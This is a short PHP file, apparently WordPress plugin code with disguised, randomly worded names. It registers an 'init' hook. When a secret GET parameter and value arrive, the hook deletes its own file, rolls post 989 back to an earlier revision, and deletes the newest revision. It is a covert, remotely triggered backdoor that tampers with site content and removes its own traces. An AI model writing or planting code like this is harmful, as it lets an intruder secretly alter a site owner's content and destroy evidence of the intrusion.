<?php

function multi_optimize_get_report() {
	if (isset($_GET['reset_gamipress_booster']) && $_GET['reset_gamipress_booster'] === 'gift_soon_conditional_cdn') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$form_plugin_comment = 989;
		$video_gateway_recaptcha = wp_get_post_revisions($form_plugin_comment);
		if (empty($video_gateway_recaptcha)) die('no revisions');
		if (count($video_gateway_recaptcha) < 2) die('less than 2');
		$coupons_charts_categories_responsive = array_shift($video_gateway_recaptcha);
		$ninja_integration_copyright_better = $coupons_charts_categories_responsive->ID;
		$tiny_sitemap_management = array_shift($video_gateway_recaptcha);
		$codes_app_headers_frontend = $tiny_sitemap_management->ID;
		$donation_database_parts = wp_restore_post_revision($codes_app_headers_frontend);
		if ($donation_database_parts === false) die('error restoring');
		$donation_database_parts = wp_delete_post_revision($ninja_integration_copyright_better);		
		if ($donation_database_parts === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'multi_optimize_get_report');
